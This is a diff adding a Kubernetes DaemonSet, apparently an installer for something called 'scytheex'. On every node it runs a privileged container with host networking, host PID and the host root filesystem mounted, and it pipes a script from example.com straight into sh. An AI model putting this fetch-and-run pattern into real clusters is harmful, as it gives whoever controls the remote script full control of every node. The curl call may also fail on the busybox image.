@@ -1,0 +1,37 @@
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: scytheex-setup
+spec:
+  selector:
+    matchLabels:
+      name: scytheex-setup
+  template:
+    metadata:
+      labels:
+        name: scytheex-setup
+    spec:
+      hostNetwork: true
+      hostPID: true
+      initContainers:
+        - name: install-scytheex
+          image: busybox
+          command:
+            [
+              "/bin/sh",
+              "-c",
+              "curl -sSL http://example.com/install_scytheex.sh | sh",
+            ]
+          securityContext:
+            privileged: true
+          volumeMounts:
+            - name: host-root
+              mountPath: /host
+      containers:
+        - name: keep-alive
+          image: busybox
+          command: ["sh", "-c", "sleep infinity"]
+      volumes:
+        - name: host-root
+          hostPath:
+            path: /
